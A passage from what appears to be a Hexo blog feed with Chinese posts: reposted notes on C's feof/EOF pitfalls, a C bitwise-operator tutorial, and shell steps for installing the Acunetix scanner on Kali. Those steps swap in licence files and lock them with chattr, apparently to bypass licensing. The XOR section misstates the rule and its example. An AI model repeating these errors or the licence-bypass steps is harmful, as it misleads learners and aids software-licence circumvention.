class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/konghouy/article/details/80530937">https://blog.csdn.net/konghouy/article/details/80530937</a></p><p>刚开始学习C语言的时候，关于文件指针读取字符的使用情况总是会遇到各种奇奇怪怪的问题，有时候莫名多出一个空格或者一个空行，后来慢慢接触的多了，才发现这其中的原理，会涉及到输入和输出流的一些问题，现在深刻的觉得要学好哪怕是一件很小的事情，我们都要抱着深入钻研的精神。下午差不多花了两个多小时的时间来了解feof的使用情况，现做如下的总结。</p><p>一.feof介绍：</p><p>1.在stdio.h中的宏定义</p><h1 id="define-IOEOF-0x0010"><a href="#define-IOEOF-0x0010" class="headerlink" title="define  _IOEOF  0x0010"></a>define  _IOEOF  0x0010</h1><h1 id="define-feof-stream-stream-gt-flag-amp-IOEOF"><a href="#define-feof-stream-stream-gt-flag-amp-IOEOF" class="headerlink" title="define  feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)"></a>define  feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)</h1><p>2.feof的使用：</p><p>feof用检测流上的文件结束符，其返回值有两种情况：如果遇到文件结束，函数值为非零值，否则函数值为0。</p><p>注：此处的文件结束标志是EOF，EOF的16进制代码为0xFF（十进制为-1），特用在文本文件中，因为在文本文件中数据是以ASCⅡ代码值的形式存放，普通字符的ASCⅡ代码的范围是32到127（十进制），与EOF不冲突，因此可以直接使用。但是在二进制文件中，数据有可能出现-1，因此不能用EOF来作为二进制文件的结束标志，可以通过feof函数来判断。</p><p>3.feof的工作原理：</p><pre><code>关于这个原理介绍，网上看到了好多资料，其中一个的解释最为形象，易于理解，特在此地引用，后文会推荐那位博主的博客链接，可以看一下正版的东西。</code></pre><p>在C语言中有feof()函数，在数据库中有eof()函数，二者作用一样，但是运作方式确实完全不同的。在数据库中，eof()函数的使用符合我们的直观感受，它是读取指针当前的位置，如果指针处于最后一个字符的位置，就知道文件结束了，举个例子，就像你走到了火车的最后一节位置，可知火车到头了。但是在C语言中，feof()函数的使用是根据指针内容判断的，而非指针位置，无论指针是否到头，甚至超出了，它都需要先读取指针的内容，看一看内容是否是EOF，然后才知道文件到头了，同样在之前的例子中，你走到了最后一节的，但是由于最后一节仍有乘客，所以你会判断火车没有到头，你继续向前走，直到下了火车，站在轨道上，没有一个乘客，所以你知道火车到头了。因此，就会出现一些奇怪的现象，我们的目标文档中总会比源文档多出一些，有时候可能是最后字符重复一遍的问题。</p><p>二.feof实例分析：</p><p> 接下来，根据几个小的实例代码来直观的分析feof的工作原理。在此，我以文件读取为例，从test中读取数据，然后根据不同大读取方式来分析结果。</p><p>test.txt:</p><p>1 2 3              注意：文档中1,2,3之间有一个空格，在3之后没有空行。</p><p>常见错误代码：</p><p>Code1.</p><p>  char ch;</p><p>  while(!feof(fp))</p><p> {</p><pre><code>    ch=fgetc(fp);    printf(&quot;%c&quot;,ch);</code></pre><p>  }</p><p>实验结果:</p><p>分析：</p><p>刚才特地提到，在文本中3之后已经结束，但是这里的输出结果中莫名多了一个不可见的字符，然后我们来探究一下这个字符是什么。</p><p>   修改代码:  printf(“%c”,ch); ——-&gt; printf(“%d*”,ch); 输出每个字符的值，得到：</p><p>   通过对比，我们看到最后的字符值是-1，也就是刚才提到的EOF。也许此刻你会想，既然是EOF，为什么把文件结束标志输出来了，不是已经增加了判断!feof(fp)？现在你可以回想一下之前在文章开始的介绍，我们说过feof并不是真正的结束，它需要遇到EOF时才会变成正值，此刻才是结束，也就是说，feof需要在读出EOF之后，才知道文件结束了，现在我们把feof的返回值输出来看一下它是在什么时候变值的。</p><p>   通过对比，我们看到，在读取最后一个字符3后，feof()的返回值是0，此时while()条件成立，然后继续向文件后读，读出文件结束标志EOF，此刻feof()的返回值变位16,while()条件不满足，因此不再继续，但是由于读出了最后一个EOF，按照代码的要求，读一个马上输出来，因此要输出来，就出现了上文的多出来一个字符情况。</p><p>Code2.</p><p>如果将上述代码中 ch=fgetc(fp);—-&gt;fscanf(fp,”%c”,&amp;c);,即使用fscanf函数，出现如下结果:</p><p>同样的，此时把最后一个字符重复输出了，我们继续查看一下feof的值变化情况.</p><p>   和上面的分析情况相似，至于为什么最后一个字符输出的是3，而不是上面的EOF ,这就是fscanf的使用问题了，关于fscanf在遇到EOF时，应经不能读入有效字符了，但是此时输出流中的字符还是3，因此printf中又输出一遍3。</p><p>解决办法：</p><p>上述的问题就是我们常见的多输出问题，那么该怎么样解决这些问题呢，我在此提出两种解决办法。</p><p>Code3:</p><p>char c;</p><p> c=fgetc(fp);</p><p> while(!feof(fp))</p><p>  {</p><pre><code>    printf(&quot;%c&quot;,c);    c=fgetc(fp);</code></pre><p>   }</p><p>这种解决办法只是写法上的巧妙变化，在1和2中，我们倾向于现在读入，现在输出，在3中我们提出一种新的思想，先读入，然后判断此时的指针位置是否合法，在合法的情况下输出上一次读入的值，然后在读取下一个，也就是先读然后判断最后输出的模式，我们每次输出的是上次的字符，因此在最后一个不合法的位置，我们输出了最后一个字符，之后就不会继续循环了。实验结果如下：</p><p>Code4:</p><p>如果你读取函数是要按照整型读取时，并且文件的结尾存在换行时，我们也可以采用fscanf的方式来判断是否读到文件结尾。如下代码：</p><pre><code>  int c;  while((fscanf(fp,&quot;%d&quot;,&amp;c))==1)    // while((fscanf(fp,&quot;%d&quot;,&amp;c))!=EOF)  &#123;     printf(&quot;%d-&quot;,c);  &#125;</code></pre><p>这种解决办法采用的是利用fscanf的返回值来判断文件是否结束，关于fscanf的返回值是：fscanf返回的是实际读取的数据个数，出错或者到结尾返回EOF。在读取最后一个字符时，fscanf不能读到有效字符，因此结果将会返回EOF，自然不会进入whie循环中，整体思路是先判断读到的字符是否合法，然后才输出。实验结果如下：</p><p>5.补充：我在4中特意提到了文件结尾存在换行，现提出一种很奇怪的现象。</p><p>5.1在处理整型数据时，文件结尾没有换行，即使按照1和2的错误方式写，也不存在上述的多读问题，如下：</p><p>int c;</p><pre><code>while(!feof(fp))&#123;    fscanf(fp,&quot;%d&quot;,&amp;c);    printf(&quot;%d-&quot;,c);&#125;</code></pre><p>实验结果如下：</p><p>5.2如果我将test.txt中的问价稍作改变，在1 2 3后加上换行，就会出现多读问题，测试结果如下：</p><p>针对5中的现象，现在我还没有理解具体是什么原因造成的，以后等到学会时在继续写吧。<br>————————————————<br>版权声明：本文为CSDN博主「lhyer」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/lhyer/article/details/45012233">https://blog.csdn.net/lhyer/article/details/45012233</a></p><p>在c语言中经常用EOF和feof()来判断文件的结束，现将有关用法总结如下：</p><p>定义<br>EOF是End Of File 的缩写，是c语言中标准库中定义的宏，定义为：#define  EOF  (-1)；<br>feof() 用于测试流文件的结束，有宏和函数两种定义：<br>宏定义： #define feof(_stream)  ((_stream)-&gt;_flag &amp; _IOEOF)，其中_IOEOF的为：#define _IOEOF 0x0010<br>函数定义：int feof( FILE *stream );<br>说明<br>      EOF的值为-1，是int类型数据，在32位系统中，可以表示为0xFFFFFFFF; EOF 不是一个字符，也不是文件中实际存在的内容。EOF不但能表示读文件到了结尾这一状态，它还能表示 I/O 操作中的读、写错误（可以用 ferror() 来检测）以及其它一些关联操作的错误状态；<br>      feof()只用于测试流文件的结束，当到达结尾时，返回非0；当文件内部位置指针指向文件结束时，并未立即置位FILE结构中的文件结束标记，只有再执行一次读文件操作，才会置位结束标志，此后调用feof才会返回为真。<br>      函数如fgetc或getc返回EOF并不一定表示文件结束，当读取文件出错时也会返回EOF，仅凭返回-1就认为文件结束是错误的；正因为如此，我们需要feof()来判断文件是否结束，当然用feof()来判断文件结束时也需要判断读取操作是否出错，这时可以用ferror()来判断，当其为真时表示有错误发生。在实际的程序中，应该每执行一次文件操作，就用用ferror函数检测是否出错。<br>举例<br>假设文件指针fp指向某个文件，文件中有字符串“hello”，下面的代码将输出hello外，还将输出一个结束字符EOF(EOF是fgetc函数的返回值，并不是文件中存在EOF)：</p><pre><code>int c=0;while(!feof(fp))&#123;    int c=fgetc(fp);    printf(&quot;%c:/t%x/n&quot;,c,c);&#125;</code></pre><p>其原因就是当内部指针指向结尾时，还要执行一次读操作，文件结束标记才置位，而下面的代码将只输出“hello”不输出文件结束符：</p><p>int c；<br>         c=fgetc(fp);<br>    while(!feof(fp))<br>    {<br>        printf(“%c:/t%x/n”,c,c);<br>        c=fgetc(fp);<br>    }</p><p>当文件内部指针指向结束位置时，先执行一次读操作，置位文件结束标记，while循环立即结束。<br>需要注意的几点</p><p>(1) 字节的读取和写入</p><pre><code>  fgetc或getc返回一个int类型数据，在正常的情况下, fgetc或getc以 unsigned char 的方式读取文件流, 扩张为一个整数,并返回. 换言之, fgetc 从文件流中取一个字节, 并加上24个零，成为一个小于256的整数，然后返回。</code></pre><p> int c;<br>     while ((c = fgetc (rfp))!= -1) // -1就是 EOF<br>         fputc (c, wfp);</p><pre><code>  在正常读取的情况下, 上述fgetc函数返回的整数均小于256, 即0x0~0xFF. 而读不出 0xFFFFFFFF；而写入时fputc 中的 c 虽然是整数, 但在 fputc 将其写入文件流之前, 又把整数的高24位去掉了, 所以如果用fputc把 0xFFFFFFFF 往文件里头写, 高24位被屏蔽,写入的将是 0xFF.</code></pre><p>(2) fgetc返回值的类型（以(1)中的代码为例）</p><pre><code>   fgetc()返回类型为int，我们可以将其返回值赋给一个int类型变量，如(1)中的代码，即使是遇到字符0xFF(blank的ascii码，不是EOF),while循环也不会结束，因为0xFF会被转化0x000000FF，显然这与0xFFFFFFFF(EOF)是不相等的，这时能完成正确复制；  如果用一个char 类型的变量c 来接收fgetc()的返回值，会出现什么情况？ 假定下一个读取的字符为0xFF 则：</code></pre><p>char c = fgetc (rfp)； // fgetc(rfp)的值为 0x000000FF， 然后强制转化为char类型：c = 0xFF<br>while(c != EOF) ；     // 字符与整数比较? c 被带符号(signed)扩展为0xFFFFFFFF，条件成立，文件复制提前退出，故遇到空格字符时就退出，不能完成复制；</p><pre><code>  如果将c 定义为unsigned char，当读到文件末尾，返回 EOF 也就是 -1 时：</code></pre><p>unsigned char c = fgetc (rfp)；// fgetc (rfp)的值为EOF，即-1，即0xFFFFFFFF，然后强制转化为uchar类型, c=0xFF<br>while( c!= -1)  ；                        // c 被扩展为 0x000000FF, 永远不会等于 0xFFFFFFFF，所以这次虽然能正确复制 0xFF, 但却不能判断文件结束. 事实上,在 c 为 uchar 时,c != -1 是永远成立的！</p><pre><code>  因此，只能将c定义成int类型的变量，这样才与fgetc返回类型一致。</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「flyyyri」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/flyyyri/article/details/5084981">https://blog.csdn.net/flyyyri/article/details/5084981</a></p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言运算符</title>
    <link href="/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2021/07/27/Code/C/C%E8%AF%AD%E8%A8%80%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言运算符"><a href="#C语言运算符" class="headerlink" title="C语言运算符"></a>C语言运算符</h1><p>C语言运算符指的是运算符号。C语言中的运算符号分为10类：算术运算符、关系运算符、逻辑运算符、位操作运算符、赋值运算符、条件运算符、逗号运算符、指针运算符、求字节数运算符和特殊运算符。</p><h2 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h2><p>C语言中的运算符号总共有34种，分为10类。</p><h3 id="位操作运算符"><a href="#位操作运算符" class="headerlink" title="位操作运算符"></a>位操作运算符</h3><p>参与运算的量，按二进制位进行运算。</p><p>位操作运算符共有6种，包括：位与（&amp;）、位或（|）、位非（~）、位异或（^）、左移（&lt;&lt;）、右移（&gt;&gt;）。</p><h4 id="位与（-amp-）"><a href="#位与（-amp-）" class="headerlink" title="位与（&amp;）"></a>位与（&amp;）</h4><p>参加运算的两个数据，按二进制位进行“与”运算。</p><ul><li><p>运算规则：0&amp;0=0，0&amp;1=0，1&amp;0=0，1&amp;1=1，即：两位同时为1，结果才为1，否则为0</p><blockquote><p>例如：3&amp;5=1，即：0000 0011 &amp; 0000 0101 = 0000 0001</p></blockquote></li><li><p>负数按补码形式参加位与运算。</p></li><li><p>“与运算”的特殊用途：</p><ul><li><p>将一个数的指定位置为0</p><blockquote><p>如果想将一个数中的某一位置为零，只需与相应位为0，其余各位为1的数做位与运算</p><p>例：设X=1010 1110，将X的第二位变为0，则 1010 1110 &amp; 1111 1011 = 1010 1010</p></blockquote></li><li><p>取一个数的指定位</p><blockquote><p>如果想取一个数中的某一或某些指定位，只需与相应位为1，其余各位为0的数做位与运算</p><p>例：设X=1010 1110，取X的低4位，则 1010 1110 &amp; 0000 1111 = 0000 1110 </p><h4 id="位或（-）"><a href="#位或（-）" class="headerlink" title="位或（|）"></a>位或（|）</h4></blockquote></li></ul></li></ul><p>参加运算的两个对象，按二进制位进行“或”运算。</p><ul><li><p>运算规则：0|0=0，0|1=1，1|0=1，1|1=1，即：参加运算的两个对象只要有一个为1，其值为1</p><blockquote><p>例如：3|5=7，即：0000 0011 | 0000 0101 = 0000 0111</p></blockquote></li><li><p>负数按补码形式参加位或运算。</p></li><li><p>“或运算”的特殊用途：</p><ul><li><p>将一个数的指定位置为1</p><blockquote><p>如果想将一个数中的某一或某些指定位置为1，只需与相应位为1，其余各位为0的数做位或运算</p><p>例：设X=1010 0000，将X的低4位置为1，则 1010 0000 | 0000 1111 = 1010 1111</p><h4 id="位异或（-）"><a href="#位异或（-）" class="headerlink" title="位异或（^）"></a>位异或（^）</h4></blockquote></li></ul></li></ul><p>参加运算的两个数据，按二进制位进行“异或”运算。</p><ul><li><p>运算规则：0^0=0，0^1=1，1^0=1，1^1=0，即：参加运算的两个对象值不同，值为1，否则为0。</p></li><li><p>“异或运算”的特殊作用：</p><ul><li><p>使特定位翻转</p><blockquote><p>如果想将一个数中的某一或某些指定位置翻转，只需与相应位为1，其余各位为0的数做位异或运算 </p><p>例：设X=1010 1110，使X低4位翻转，则 1010 1110 &amp; 0000 1111 = 1010 0001 </p></blockquote></li><li><p>与0异或，保留原值</p><blockquote><p>例：设X=1010 1110，则 1010 1110 ^ 0000 0000 = 1010 1110</p></blockquote></li></ul></li></ul><p>异或运算其实就是不进位加法，如1+1=0，0+0=0，1+0=1，0+1=1</p><ul><li>异或的几条性质：<ul><li>交换律</li><li>结合律（即(a^b)^c = a^(b^c)）</li><li>对于任何数x，都有x^x=0，x^0=x</li><li>自反性：a^b^b = a^0 = a</li></ul></li></ul><p>异或运算最常见于多项式除法，不过它最重要的性质还是自反性：A XOR B XOR B = A，即对给定的数A，用同样的运算因子（B）作两次异或运算后仍得到A本身。</p><p>这是一个神奇的性质，利用这个性质，可以获得许多有趣的应用。 例如，所有的程序教科书都会向初学者指出，要交换两个变量的值，必须要引入一个中间变量。但如果使用异或，就可以节约一个变量的存储空间。</p><p>设有a,b两个变量，则以下三行表达式将互换他们的值表达式：</p><blockquote><p>a=a^b;<br>b=b^a;<br>a=a^b;</p></blockquote><h4 id="左移（-lt-lt-）"><a href="#左移（-lt-lt-）" class="headerlink" title="左移（&lt;&lt;）"></a>左移（&lt;&lt;）</h4><ul><li><p>运算规则：将一个运算对象的各二进制位全部左移若干位，左边的二进制位丢弃，右边补0。</p><blockquote><p>例：设X=1010 1110，X = X&lt;&lt; 2，则 X=1010 1110 左移2位，右边补0，X=1011 1000</p></blockquote></li><li><p>若左移时舍弃的高位不包含1，则操作数每左移一位，相当于该数乘以2，即X = X *2</p><blockquote><p>例：设X=46=0010 1110，X = X&lt;&lt; 2，则 X=0010 1110 左移2位，右边补0，X=1011 1000=184</p><p>​        184 = 46 <em>2 </em>2，即X = X <em>2 </em>2</p></blockquote></li></ul><h4 id="右移（-gt-gt-）"><a href="#右移（-gt-gt-）" class="headerlink" title="右移（&gt;&gt;）"></a>右移（&gt;&gt;）</h4><ul><li><p>将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。</p><blockquote><p>例如：设X=1010 1110，X = X &gt;&gt; 2，则 X=1010 1110 右移2位，左边补0，X=0010 1011</p></blockquote></li><li><p>操作数每右移一位，相当于该数除以2，即X = X /2</p></li><li>左补0 or 补1得看被移数是正还是负。</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当进行位运算时，首先转换成二进制，然后计算</p><ul><li><p>位与 &amp;：全1为1， 其他的为0</p></li><li><p>位或 |：全0为0，其他为1</p></li><li><p>异或 ^：相同为1，不同为0</p></li><li><p>左移 &lt;&lt; ：A &lt;&lt; b   == &gt;&gt;   A *２^b次方，注意边界，在32为机器下，如果ｂ&gt;32，b% 32 = t，则a &lt;&lt; t</p></li><li><p>右移 &gt;&gt; ：A &gt;&gt; b   == &gt;&gt;   A / 2 ^b 次方</p></li></ul><h5 id="应用举例1："><a href="#应用举例1：" class="headerlink" title="应用举例1："></a>应用举例1：</h5><p>1-1000放在含有1001个元素的数组中，只有唯一的一个元素值重复，其它均只出现一次。每个数组元素只能访问一次，设计一个算法，将它找出来。不用辅助存储空间，能否设计一个算法实现？</p><ul><li><p>解法一：将所有数加起来，减去1+2+…+1000的和，结果便是重复的元素。</p><blockquote><p>这个算法已经足够完美了，但唯一的问题是，如果数列过大，则可能会导致溢出。</p></blockquote></li><li><p>解法二：将所有的数全部异或，得到的结果与1^2^3^…^1000的结果进行异或，得到的结果就是重复元素。</p><blockquote><p>异或就没有溢出问题，并且性能更好。</p></blockquote></li></ul><h5 id="应用举例2-综合-amp-和-：-lt-span-class-”hint—top-hint—rounded”-aria-label-”题目链接-http-gdutcode-sinaapp-com-problem-php-cid-1051-amp-pid-7"><a href="#应用举例2-综合-amp-和-：-lt-span-class-”hint—top-hint—rounded”-aria-label-”题目链接-http-gdutcode-sinaapp-com-problem-php-cid-1051-amp-pid-7" class="headerlink" title="应用举例2(综合&amp;和)：&lt;span class=”hint—top hint—rounded” aria-label=”题目链接:http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7"></a>应用举例2(综合&amp;和)：<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote">&lt;span class=”hint—top hint—rounded” aria-label=”题目链接:<a href="http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7">http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7</a></a></sup></h5><p>“&gt;[1]&lt;/span&gt;&lt;/a&gt;&lt;/sup&gt;</p><p>一系列数中，除两个数外其他数字都出现过两次，求这两个数字，并且按照从小到大的顺序输出。例如 2 2 1 1 3 4，最后输出的就是3和4。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(<span class="hljs-keyword">int</span> t,<span class="hljs-keyword">int</span> *data)</span>      <span class="hljs-comment">//数据组数t、数据data</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-keyword">int</span> n;     <span class="hljs-comment">//每组数据含有的数据量</span><br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>        data = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>((n+<span class="hljs-number">1</span>)*<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>        <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;                    <span class="hljs-comment">//位异或运算后，数据不变</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;data[i]);   <span class="hljs-comment">//输入数据</span><br>            x ^= data[i];            <span class="hljs-comment">//x为两个不同数据的位异或（位异或运算的自反性）</span><br>        &#125;<br>        <span class="hljs-keyword">int</span> num1 = <span class="hljs-number">0</span>, num2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> tmp = <span class="hljs-number">1</span>;                 <span class="hljs-comment">//1与任何数运算后数不变，0与任何数运算后都为0</span><br>        <span class="hljs-keyword">while</span>(!(tmp &amp; x))           <span class="hljs-comment">//找到两个数据不同的位，tmp中相应的位为1，其余为0</span><br>            tmp &lt;&lt;= <span class="hljs-number">1</span>;              <span class="hljs-comment">//tmp左移一位</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(tmp &amp; data[i])       <span class="hljs-comment">//除找到的位外，其余位在进行与运算后都为零</span><br>                num1 ^= data[i];<br>            <span class="hljs-keyword">else</span><br>                num2 ^= data[i];<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, min(num1, num2), max(num1, num2));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>题目链接:<a href="http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7">http://gdutcode.sinaapp.com/problem.php?cid=1051&amp;pid=7</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装AWVS</title>
    <link href="/2021/07/27/Linux/Kali/kali%E5%AE%89%E8%A3%85AWVS/"/>
    <url>/2021/07/27/Linux/Kali/kali%E5%AE%89%E8%A3%85AWVS/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-Linux-安装-AWVS-14-6-21120709"><a href="#Kali-Linux-安装-AWVS-14-6-21120709" class="headerlink" title="Kali Linux 安装 AWVS 14.6.21120709"></a>Kali Linux 安装 AWVS 14.6.21120709</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x acunetix_14.6.211207099_x64.sh</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_14.6.211207099_x64.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo cp wa_data.dat /home/acunetix/.acunetix/data/license</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chmod 444 /home/acunetix/.acunetix/data/license/license_info.json</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo chmod 444 /home/acunetix/.acunetix/data/license/wa_data.dat</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chattr +i /home/acunetix/.acunetix/data/license/license_info.json</span> <br><span class="hljs-meta">$</span><span class="bash"> chattr +i /home/acunetix/.acunetix/data/license/wa_data.dat</span><br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-安装-AWVS-14-5-211115146"><a href="#Kali-Linux-安装-AWVS-14-5-211115146" class="headerlink" title="Kali Linux 安装 AWVS 14.5.211115146"></a>Kali Linux 安装 AWVS 14.5.211115146</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x Acunetix_14.5.211115146_x64.sh</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./Acunetix_14.5.211115146_x64.sh</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license</span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp wa_data.dat /home/acunetix/.acunetix/data/license</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /home/acunetix/.acunetix/data/license</span><br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-2021-2-安装-AWVS13"><a href="#Kali-Linux-2021-2-安装-AWVS13" class="headerlink" title="Kali Linux 2021.2 安装 AWVS13"></a>Kali Linux 2021.2 安装 AWVS13</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip AWVS13_linux.zip</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> chmod +x acunetix_13.0.200217097_x64_.sh</span> <br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_13.0.200217097_x64_.sh</span><br>Accept the license terms? [yes|no]<br><span class="hljs-meta">&gt;</span><span class="bash">&gt;&gt; yes</span> <br><br>    Hostname [AJESTdeKALI]:<br><br>    Email: ajest@dnsec.com.cn<br>    Password: abc123!@#<br>    Password again: abc123!@#<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp -rf wvsc /home/acunetix/.acunetix/v_200217097/scanner/</span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl restart acunetix</span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl <span class="hljs-built_in">disable</span> acunetix.service</span> <br></code></pre></td></tr></table></figure><h2 id="Kali-Linux-2020-4-安装-AWVS"><a href="#Kali-Linux-2020-4-安装-AWVS" class="headerlink" title="Kali Linux 2020.4 安装 AWVS"></a>Kali Linux 2020.4 安装 AWVS</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Kali-Linux-2020.4-vmware-amd64<br></code></pre></td></tr></table></figure><ul><li>命令</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unzip AWVS13_linux.zip</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> awvs13-linux/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo chmod +x *</span><br><span class="hljs-meta">$</span><span class="bash"> sudo ./acunetix_13.0.200217097_x64_.sh</span><br><br>    Hostname [kali]:<br><br>Configuring the master user...<br>    Email: ajest@kali.org<br>    Password: abc123!@#<br>    Password again: abc123!@#<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp -rf wvsc /home/acunetix/.acunetix/v_200217097/scanner/</span><br><span class="hljs-meta">$</span><span class="bash"> sudo cp license_info.json /home/acunetix/.acunetix/data/license/</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo systemctl restart acunetix</span><br></code></pre></td></tr></table></figure><ul><li>web 登录</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://127.0.0.1:3443/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>AWVS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git-Gitee初步配置及使用</title>
    <link href="/2021/07/27/Tools/Git/Git-Gitee%E5%88%9D%E6%AD%A5%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
